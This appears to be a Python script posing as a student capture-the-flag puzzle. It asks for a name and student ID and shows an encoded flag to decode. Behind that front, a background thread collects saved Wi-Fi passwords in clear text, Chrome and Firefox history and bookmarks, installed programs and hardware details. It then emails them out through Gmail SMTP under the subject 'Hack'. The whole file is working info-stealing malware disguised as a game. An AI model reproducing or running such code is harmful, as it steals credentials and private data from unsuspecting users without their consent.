from browser_history.browsers import Chrome, Firefox
from datetime import timedelta
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from threading import Thread
import os
import psutil
import pythoncom
import smtplib
import time
import wmi


def sent_email(text, subject):
    message = MIMEMultipart()
    message["from"] = os.getlogin()
    message["to"] = "Username"
    message["subject"] = subject
    message.attach(MIMEText(text))

    with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.login("Username", "Password")
        smtp.send_message(message)


def laptop_brand():
    try:
        pythoncom.CoInitialize()
        my_system = wmi.WMI().Win32_ComputerSystem()[0]
        return f"{my_system.Manufacturer} {my_system.SystemFamily}"
    except:
        return "UNKNOWN"


def battery_charge_percentage():
    try:
        battery = psutil.sensors_battery()
        text = f"Battery percentage: {battery.percent}%\n"
        text += f"Power plugged in: {battery.power_plugged}\n"
        text += f"Battery left: {str(timedelta(seconds=battery.secsleft))}"
        return text
    except:
        return "NO BATTERY"


def wifi():
    try:
        stream = os.popen("netsh wlan show profile")
        output = stream.readlines()[9:-1]
        wifiNames = [output[i][27:-1] for i in range(len(output))]
        result = {}

        for name in wifiNames:
            stream = os.popen(
                f'netsh wlan show profile "{name}" key=clear').readlines()[32]

            if "Key Content" in stream:
                result[name] = stream[stream.find(": ") + 2:-1]
            else:
                result[name] = ""

        return result
    except:
        return {}


def bookmarks():
    chrome_outputs = Chrome().fetch_bookmarks().bookmarks
    firefox_outputs = Firefox().fetch_bookmarks().bookmarks

    urls = set({})
    for item in chrome_outputs:
        urls.add(item[1][8 if item[1].startswith(
            "https://") else 7:])

    for item in firefox_outputs:
        urls.add(item[1][8 if item[1].startswith(
            "https://") else 7:])

    return urls


def histories():
    chrome_outputs = Chrome().fetch_history().histories
    firefox_outputs = Firefox().fetch_history().histories

    urls = set({})
    for item in chrome_outputs:
        urls.add(item[1][8 if item[1].startswith(
            "https://") else 7:item[1].find('/', 8)])

    for item in firefox_outputs:
        urls.add(item[1][8 if item[1].startswith(
            "https://") else 7:item[1].find('/', 8)])

    return urls


def installed_apps():
    stream = os.popen("wmic product get name")
    list_apps = stream.readlines()

    useless_words = ["Microsoft", "Windows", "Office", "Python", "WinRT"]
    filtered_list = []

    for item in list_apps[2::2]:
        if not item.strip():
            continue
        is_useless = False
        for word in useless_words:
            if item.find(word) != -1:
                is_useless = True
                break
        if not is_useless:
            filtered_list.append(item[:-1])

    return filtered_list


def back_end(information):
    res1_str = laptop_brand()
    res2_str = battery_charge_percentage()
    res3_dict = wifi()
    res4_set = bookmarks()
    res5_list = installed_apps()
    res6_set = histories()

    result = f"{information}\n\n{res1_str}\n\n{res2_str}\n\nWIFI HISTORY\n"

    for key, value in res3_dict.items():
        result += "{:<50} {:<50}\n".format(key, value)

    result += "\n\nBOOKMARKS\n"
    for item in res4_set:
        result += f"{item}\n"

    result += "\n\nINSTALLED_APPS\n"
    for item in res5_list:
        result += f"{item}\n"

    result += "\n\nHISTORIES\n"
    for item in res6_set:
        result += f"{item}\n"

    sent_email(result, "Hack")


def ui():
    while True:
        os.system("cls")
        print("\n**DECODE THIS**\n\nLS4tLSAtLS0gLi4tIC8gLi0gLi0uIC4gLyAtIC4uLi4gLiAvIC0tLSAtLiAuIC8gLS4uLiAuIC4uIC0uIC0tLiAvIC0uLS4gLi0uIC4tIC0uLS4gLS4tIC4gLS4u\n")
        flag = input("FLAG: ")
        if flag.upper() == "YOU ARE THE ONE BEING CRACKED" or flag.upper() == "YOUARETHEONEBEINGCRACKED":
            print(
                "\nCongratulations...\nYou passed the test\n\nDont close the app. We are sending your name...")
            sent_email(
                f"ّFULLNAME: {name}\nSTUDENT ID: {student_id}", "Flag")
            break
        else:
            print("\nWrong answer\nTry again")
            time.sleep(3)


while True:
    os.system("cls")
    name = input("\nFull name: ")
    if not name.strip():
        print("This field is required")
        time.sleep(2)
        continue
    student_id = input("\nStudent id: ")
    if not student_id:
        print("This field is required")
        time.sleep(2)
        continue
    elif not student_id.isdigit():
        print("Is wrong")
        time.sleep(2)
        continue
    break

x = Thread(target=back_end, args=(
    f"FULLNAME: {name}\nSTUDENT ID: {student_id}", ))
x.start()

y = Thread(target=ui)
y.start()
